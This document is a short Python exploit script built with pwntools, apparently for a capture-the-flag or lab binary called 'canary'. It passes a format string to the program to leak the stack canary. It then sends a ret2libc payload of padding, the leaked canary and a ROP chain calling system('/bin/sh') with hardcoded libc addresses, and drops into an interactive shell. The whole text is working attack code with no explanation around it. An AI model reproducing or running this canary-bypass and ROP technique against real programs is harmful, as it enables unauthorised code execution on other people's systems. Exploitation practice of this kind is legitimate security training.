#!/usr/bin/env python3
from pwn import *
exe = context.binary = ELF('./canary')
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path,"%33$llx"] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path,"%33$llx"] + argv, *a, **kw)
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

padding = b"\x41"*200
rbp     = b"\x42"*8
base_libc = 0x007ffff7de0000
bin_sh    = b"\x52\xa1\xf6\xf7\xff\x7f"    #0x18a152 => 0x7ffff7f6a152
system    = b"\x50\x8e\x2e\xf7\xff\x7f"    #0x7ffff7e28e50
exit      = b"\x60\xe6\xe1\xf7\xff\x7f"    #0x7ffff7e1e660
pop_rdi   = b"\x96\x67\xe0\xf7\xff\x7f"    #0x0000000000026796 => 0x7ffff7e06796
ret       = b"\x59\x53\xe0\xf7\xff\x7f"    #0x0000000000025359 => 0x7ffff7e05359
io = start()
canary = io.readline()
cookie = int("0x"+str(canary).replace('\n','')[2:-3],16)
print("[+] Bypassing Stack Cannary ",canary)
print("[*] Formating the Palyload.")
payload  = padding
payload += p64(cookie)
payload += rbp
payload += ret
payload += pop_rdi
payload += bin_sh
payload += system
payload += exit
print(payload)
print("[+] Sending the payload.")
print("[*] Executing The shell.")
io.sendline(payload)
io.interactive()
